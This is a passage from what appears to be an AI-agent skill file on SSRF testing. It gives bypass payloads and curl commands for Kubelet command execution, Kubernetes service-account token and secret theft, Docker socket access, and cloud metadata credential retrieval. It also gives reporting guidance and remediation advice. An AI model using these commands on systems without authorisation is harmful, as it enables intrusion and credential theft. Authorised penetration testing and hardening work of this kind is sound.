#### Bypass Testing

1. Test IP representation variations:

   ```
   http://127.0.0.1/
   http://2130706433/
   http://0x7f.0.0.1/
   http://017700000001/
   ```

2. Test with URL encoding:

   ```
   http://127.0.0.1/ → http://127%2e0%2e0%2e1/
   ```

3. Test with open redirects:

   ```
   https://allowed-domain.com/redirect?url=http://internal-server
   ```

4. Test DNS rebinding with modern tools:

**Modern DNS Rebinding Tools:**

- **1u.ms** - Online DNS rebinding service (successor to rebinder.net)
- **Singularity of Origin** - Advanced rebinding toolkit with GUI
- **rbndr.us** - Simple rebinding for pentesting (format: `make-<ip1>-<ip2>-rbndr.us`)
- **lockyfork/rebind** - Docker container for self-hosted rebinding server
- **DNSRebindToolkit** - Python-based customizable rebinding server

Example usage:

```bash
# Using rbndr.us: first resolves to your server, then to internal IP
curl http://make-1.2.3.4-127.0.0.1-rbndr.us

# Using 1u.ms
curl http://1u.ms/A-127.0.0.1:1-2  # Alternates between external and localhost
```

### Reporting

- Document the affected endpoint and parameters
- Provide clear proof of concept
- Explain potential impact (data access, internal recon, etc.)
- Suggest specific remediation for the vulnerability
- Include any bypass techniques that worked

## Escalate

- Perform Network Scanning to identify another vulnerable machine
- Pull Instance Metadata from cloud machines
- Kubernetes pivot: test common internal services from SSRF vantage point

### Kubernetes-Specific SSRF Attack Surface

#### Service Account Token Theft

```bash
# From SSRF vantage point:

# 1. Kubelet API (often unauthenticated or weakly authenticated)
curl http://127.0.0.1:10250/pods        # List all pods on node
curl http://127.0.0.1:10250/run/<namespace>/<pod>/<container> -d "cmd=id"  # Execute commands
curl http://127.0.0.1:10255/pods        # Read-only port (legacy, often still open)

# 2. Extract service account token
curl file:///var/run/secrets/kubernetes.io/serviceaccount/token
# Or via SSRF
http://vulnerable-app?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token

# 3. Use service account to access Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/default/pods

# 4. List secrets
curl -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

#### Service Mesh Metadata Exposure

**Istio/Envoy:**

```bash
# Envoy admin interface (often exposed on localhost)
http://127.0.0.1:15000/config_dump      # Full mesh configuration, certificates, endpoints
http://127.0.0.1:15000/clusters         # Upstream services and health
http://127.0.0.1:15000/stats            # Detailed metrics
http://127.0.0.1:15000/certs            # TLS certificates
http://127.0.0.1:15001/                 # Envoy admin on alternative port

# Pilot discovery service
http://127.0.0.1:8080/debug/endpointz   # Service endpoints
http://127.0.0.1:8080/debug/configz     # Pilot configuration
```

**Linkerd:**

```bash
# Linkerd proxy admin
http://127.0.0.1:4191/metrics           # Prometheus metrics (leaks service topology)
http://127.0.0.1:4191/ready             # Readiness endpoint
http://127.0.0.1:4140/                  # Inbound proxy admin
```

**Consul Connect:**

```bash
http://127.0.0.1:8500/v1/agent/self     # Agent configuration
http://127.0.0.1:8500/v1/catalog/services  # Service catalog
```

#### Container Runtime Socket Exposure

```bash
# Docker socket (if mounted - common in CI/CD containers)
# Via SSRF translate unix socket to HTTP
unix:///var/run/docker.sock

# Example: List containers
curl --unix-socket /var/run/docker.sock http://localhost/v1.40/containers/json

# Via SSRF (if application supports unix sockets):
http://vulnerable-app?url=unix:///var/run/docker.sock:/v1.40/containers/json

# containerd socket
unix:///run/containerd/containerd.sock

# CRI-O socket
unix:///var/run/crio/crio.sock
```

#### Container Metadata Services

```bash
# ECS Task Metadata Endpoint (AWS ECS/Fargate)
http://169.254.170.2/v2/metadata        # Task metadata
http://169.254.170.2/v2/credentials     # IAM credentials for task role
http://169.254.170.2/v2/stats           # Task stats
http://169.254.170.2/v3/                # v3 endpoint

# GCP Cloud Run metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google

# Azure Container Instances
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
```

#### Kubernetes Dashboard and Management Tools

```bash
# Kubernetes Dashboard (if exposed internally)
http://kubernetes-dashboard.kube-system.svc.cluster.local

# Prometheus
http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up

# Grafana
http://grafana.monitoring.svc.cluster.local:3000

# ArgoCD
http://argocd-server.argocd.svc.cluster.local

# Rancher
http://rancher.cattle-system.svc.cluster.local
```

## Remediation Recommendations

### Input Validation

- Implement strict URL validation
- Use allowlists for domains and IP ranges
- Validate URL schemes/protocols
- Implement rate limiting
- Apply layered allow-lists: validate scheme → network range → domain, in that order

### Network Controls

- Segment internal networks
- Use egress filtering
- Implement proper firewall rules
- Disable unused URL schemes
- Block the IMDSv2 token-acquire path (`PUT /latest/api/token`) for workloads that do not need EC2 metadata
- Verify that SNI and the initial `Host` header match on every new TLS connection to mitigate HTTP/2 coalescing
- Terminate user-supplied fetches in a sandboxed egress proxy that enforces allow‑lists and IP range checks after DNS resolution
- Disallow redirects to private address space; re‑validate target after each redirect hop

### Application Design

- Use pre-signed URLs for cloud resources
- Implement proper access controls
- Use secure defaults for all URL handlers
- Implement request timeouts
- Strict, two‑stage URL validation using a trusted RFC‑3986 parser: validate scheme/host first, then resolve and validate IP/CIDR
- Prefer fetching by resource ID rather than arbitrary URL; where unavoidable, use signed callbacks (HMAC) and queue‑based fetchers

## Real-World Examples

### Case Studies

- Capital One Breach (2019)
  - Exploitation of metadata service
  - Impact: 100M+ customer records exposed
- Gitlab SSRF (2019)
  - Improper URL validation in import feature
  - Could access internal services
- Microsoft Purview SSRF (2025)
  - Misconfigured proxy endpoint allowed metadata-service access, leading to cross-tenant data exposure

### Common Attack Scenarios

- Cloud metadata access leading to credential theft
- Internal service enumeration through port scanning
- Redis unauthorized access via Gopher protocol
- Jenkins exploitation through internal access

## Framework-Specific SSRF

### Node.js

- Axios validation bypass techniques
- `http-proxy` misconfigurations
- `request` module vulnerabilities
- Axios path-relative URL bypass (CVE-2024-39338) — upgrade to ≥ 1.7.4

### Python

- `requests` library security considerations
- `urllib` parsing inconsistencies
- Flask/Django SSRF prevention

### Java

- `URLConnection` security practices
- Spring framework protections
- Apache HttpClient considerations
- Apache CXF Aegis databinding SSRF (CVE-2024-28752)

---

## Attribution

Ported from [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
(`Skills/*/offensive-ssrf`), Apache-2.0 licensed. Methodology preserved; Claude-specific
mechanics rewritten for OSA's builtin tools.

Part of the offensive skill library — see also `penetration-testing` for the
full-engagement workflow and `offensive-osint` / `osint-methodology` for
reconnaissance methodology.

## Tool status note

External CLI tools referenced above are classified at authoring time as `[LOCAL]`
(verified present), `[INSTALL]` (one-command install), or `[UPSTREAM-REF]`
(needs API keys or interactive use — methodology reference only). If you invoke a
tool and it is absent, check for an `[INSTALL]` note or fall back to the OSA
builtin tools; never fabricate tool output.
